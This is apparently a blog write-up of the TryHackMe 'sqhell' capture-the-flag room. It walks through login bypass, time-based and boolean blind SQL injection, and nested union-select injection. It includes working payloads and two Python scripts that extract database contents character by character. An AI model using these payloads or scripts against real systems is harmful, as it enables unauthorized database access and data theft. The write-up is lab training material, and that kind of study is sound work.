### Overview

[sqhell](https://tryhackme.com/room/sqhell) is a fun medium rated CTF room on [TryHackMe](https://tryhackme.com) created by [Adam Langley](https://tryhackme.com/p/adamtlangley). I found this room incredibly frustrating but also very rewarding and really helped me understand some key SQLI techniques. 

> I have wrote this write up over a couple of days, so I've added a entry in my etc hosts file of 'sqhell.thm' to provide consistency across the screen shots as the IP will change.

### Nmap

I deployed the machine and started a NMAP scan to check the available ports. 

```highlight
└──╼ $sudo nmap -sC -sV -oA nmap/initial 10.10.24.70
# Nmap 7.80 scan initiated Sun May 30 17:55:54 2021 as: nmap -sC -sV -oA nmap/initial 10.10.24.70

```

2 Ports open:

- 22 - SSH - OpenSSH 8.2p1
- 80 - HTTP - nginx 1.18.0

I also ran a full port scan but no additional ports were found. 

### Flag 1

Based on the room name I know this is going to consist of SQLI challenges so I went straight to the web page and found a blog.

![homepage](/assets/images/sqhell/homepage.png)

The first thing I looked at was the login page, and tried the usual bypass technique: ```admin' or 1=1;-- -```

### Flag 2

Flag 2 was the first of the two difficult flags, Looking at the room hints:

> Make sure to read the terms and conditions ;)

![TCs](/assets/images/sqhell/TCs.png)

A common way of monitoring a client IP is adding a header to the web request such as 'X-Forwarded-For: <client ip>', I've seen this a lot on load balancers and WAF's to provide persistance and send all requests from a single source to the same webserver. Below are some example headers:

- X-Forwarded-For:
- X-Originating-IP:
- X-Remote-IP:
- X-Remote-Addr:
- X-Forwarded-Host:

I can use time based SQL injection and use sleep, if the header is vulnerable the page will sleep (wait) before returning the page. 

I opened Burp and added the X-Forwarded-For header, I tried lots of payloads with no success until I found a great [resource](https://ismailtasdelen.medium.com/sql-injection-payload-list-b97656cfd66b).

Finally the payload: ```127.0.0.1' AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '1'='1``` worked.

![timebased](/assets/images/sqhell/timebased.gif)

Now I know the X-Forwarded-For header is vulnerable I need to find a way to retrieve data. The flag format is 'THM{FLAG......' and stored in the flag column in the flag table so I can use substring to check for each character and if its a match then sleep.

Using [hacktricks](https://book.hacktricks.xyz/pentesting-web/sql-injection) I created the payload: ```1' AND (SELECT sleep(5) FROM flag where SUBSTR(flag,1,1) = 'T') and '1'='1```. I tested a few characters and incremented the offset and it confirmed this was flag 2. I created the below python script to automate the process.

```highlight
# Script to retrieve flag 2 for room SQHell - https://tryhackme.com/room/sqhell

import requests
import time
import string

url = "" #Room IP

characterlist = string.ascii_uppercase + string.digits + '{' + '}' + ':'

flag = ""
counter = 1

payload = f"1' AND (SELECT sleep(2) FROM flag where SUBSTR(flag,{counter},1) = '2') and '1'='1"

headers = {'X-Forwarded-For':payload}

while True:
    for i in characterlist:
        payload = f"1' AND (SELECT sleep(2) FROM flag where SUBSTR(flag,{counter},1) = '{i}') and '1'='1"
        headers = {'X-Forwarded-For':payload}
        start = time.time()
        r = requests.get(url, headers = headers)
        end = time.time()
        if end-start >= 2:
            flag += i
            counter += 1
            break
    print(flag)
    if len(flag) >= 43:
        exit(f"The Flag is: {flag}")
```

Running the script will retrieve the flag.

### Flag 3
Looking at the register page of the blog, its possible to check if a username already exists.

![username](/assets/images/sqhell/username.png)

This is done by a script in the page source code.

```highlight
<script>
    $('input[name="username"]').keyup(function(){
        $('.userstatus').html('');
        let username = $(this).val();
        $.getJSON('/register/user-check?username='+ username,function(resp){
            if( resp.available ){
                $('.userstatus').css('color','#80c13d');
                $('.userstatus').html('Username available');
            }else{
                $('.userstatus').css('color','#F00');
                $('.userstatus').html('Username already taken');
            }
        });
    });
</script>
```

It's possible to navigate directly to this endpoint to check the result.

![checkusername](/assets/images/sqhell/usernameavailable.gif)

We can use this to provide logic to determine if a condition is true or false. Using the payload: ```admin' and 1=2;-- -``` which of course is not true as 1 doesnt equal 1 returns an available = true statement. 

![false](/assets/images/sqhell/false.png)

However the payload: ```admin' and 1=1;-- -``` which is true returns available = false

![true](/assets/images/sqhell/true.png)

Using substring again allows for each character to be checked. If the character is a match, an available equals false will be returned. To confirm I used the payload: ```http://sqhell.thm/register/user-check?username=admin' and (substr((SELECT flag FROM flag LIMIT 0,1),1,1)) = 'T';-- -```

This worked and returned a false statement. I created a script to automate the process.

```highlight
import requests
import string

characterlist = string.ascii_uppercase + string.digits + '{' + '}' + ':'

ip = "" #change to machine IP

flag = ""

counter = 1

while True:
    for i in characterlist: # loop through each character in the character list
        r = requests.get("http://" +  ip + f"/register/user-check?username=admin' and (substr((SELECT flag FROM flag LIMIT 0,1),{counter},1)) = '{i}';-- -") #create request
        if 'false' in r.text: # check if return 'false' statement which indicates a match
            flag += i # add the character to the flag string
            counter += 1 # increment the counter by one to then check the next letter
            print(flag) 
            break
```

Running the script provided the flag.

### Flag 4
Flag 4 was the second of the two difficult flags, it has the following hint:

> Well, dreams, they feel real while we're in them right?

Googling this provides references to the film Inception. Looking at a user on the blog, showed details of the user along with the posts they had submitted. 

![user](/assets/images/sqhell/user.png)

I tried a union select payload and repeated adding null entires until I was able to determine the number of columns which was 3.

```http://sqhell.thm/user?id=1 union select null,null,null;-- -```

![select](/assets/images/sqhell/select.png)

I now spent a long time enumerating the database to find the flag but with no luck. While completing the enumeration I was able to determine there was only one user. Any other number resulted in user not found being returned. 

![user2](/assets/images/sqhell/select.png)

However, even with an invalid user id, if I changed the first null value to ```1``` I could return a list of the users posts. Which would indicate another SQL query. 

![id1](/assets/images/sqhell/id1.png)

So to test this I created another union select statement in the user id colum using the same technique as before by repeatedly adding null columns. Once I got to 4 columns the two posts were returned with a blank bullet point. 

![inception](/assets/images/sqhell/inception.png)

Now it was just a case of finding a column which I could use to populate the flag which was column two and select the flag from the flag table. The final payload was: ```http://sqhell.thm/user?id=2 union select "1 union select null,flag,null,null from flag",null,null from information_schema.tables where table_schema=database();-- -```

![flag4](/assets/images/sqhell/flag4.png)

### Flag 5
Flag 5 is obtained by using union based injection Looking at the post page url, the posts are retrieved by id: ```http://sqhell.thm/post?id=2```

![postid](/assets/images/sqhell/postid.png)

This looks injectable, to confirm I simply added a ```'``` after the id number.

![iderror](/assets/images/sqhell/iderror.png)

This resulted in an error indicating an SQLI could be possible. For a union select injection attack to work the number of returned columns need to match the original query. I used order by to determine the number of columns.

![idorder](/assets/images/sqhell/idorder.gif)

I got an error on order by 5 indicating there are 4 columns. 

![idtesting](/assets/images/sqhell/idtesting.png)

I was then able to simple retrieve the flag using the payload: ```http://sqhell.thm/post?id=2 and 1=2 union select null,null,flag,null from flag```.
